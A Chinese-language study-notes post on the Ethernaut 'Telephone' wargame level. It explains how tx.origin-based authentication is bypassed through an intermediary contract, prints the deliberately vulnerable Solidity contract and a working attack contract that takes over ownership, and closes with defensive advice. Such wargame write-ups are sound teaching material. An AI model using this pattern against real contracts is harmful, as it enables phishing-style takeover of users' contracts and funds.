---
title: "Ethernaut 靶场学习笔记 04：Telephone"
date: 2026-05-05 09:00:00
updated: 2026-05-05 09:00:00
categories:
  - "区块链安全"
  - "Ethernaut"
tags:
  - "Ethernaut"
  - "Solidity"
  - "智能合约安全"
abbrlink: "ethernaut-level-04"
---
> 这是我的 Ethernaut 靶场个人学习笔记，用来记录每一关的题目目标、漏洞原理、利用过程和复盘要点，方便后续按关卡重新练习和查漏补缺。

- 关卡：Level 4 - Telephone

## 本关目标

利用 `tx.origin` 与 `msg.sender` 的差异接管 Telephone owner。

## 考察知识点

- `tx.origin` 与 `msg.sender` 区别
- 中间合约绕过
- 钓鱼式授权风险

## 题目源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## 源码与漏洞解析

1. `tx.origin` 是整笔交易最初的外部账户，`msg.sender` 是当前这一层调用的直接调用者。
2. 如果玩家直接调用 `changeOwner`，两者相等，条件不成立。
3. 如果玩家先调用攻击合约，再由攻击合约调用 Telephone，那么 Telephone 中看到的 `tx.origin` 是玩家，`msg.sender` 是攻击合约，条件成立。
4. 这类模式在真实合约中很危险，因为用户可能被诱导调用恶意合约，恶意合约再拿用户的 `tx.origin` 去通过受害合约鉴权。

## 过程截图

![通过中间合约调用后 owner 被替换的记录。](/images/ethernaut/level04-telephone-owner.png)

图注：通过中间合约调用后 owner 被替换的记录。

## 解题过程

1. 部署中间攻击合约。
2. 用钱包调用攻击合约；此时目标合约看到的 `msg.sender` 是攻击合约，`tx.origin` 是玩家。
3. 攻击合约再调用目标的 `changeOwner(player)`。

## 攻击合约 WP

```solidity
interface ITelephone {
    function changeOwner(address newOwner) external;
}

contract TelephoneAttack {
    function attack(address instance, address player) external {
        ITelephone(instance).changeOwner(player);
    }
}
```

## 最终 WP

1. 部署一个中间攻击合约。
2. 攻击合约中调用 `Telephone(instance).changeOwner(player)`。
3. 用玩家钱包调用攻击合约，而不是直接调用 Telephone。
4. 确认 `owner()` 变成玩家地址并提交。

## 复盘与拓展

- 易错点：`tx.origin` 用于鉴权会产生钓鱼攻击面。
- 防御建议：权限判断使用 `msg.sender`，复杂授权使用签名、角色或明确的访问控制模块。

## 参考资料

- 相关资料：https://hackmd.io/@0xbc000/HkI4o9o46
- Ethernaut 官方仓库：https://github.com/OpenZeppelin/ethernaut
- Solidity 文档：https://docs.soliditylang.org/
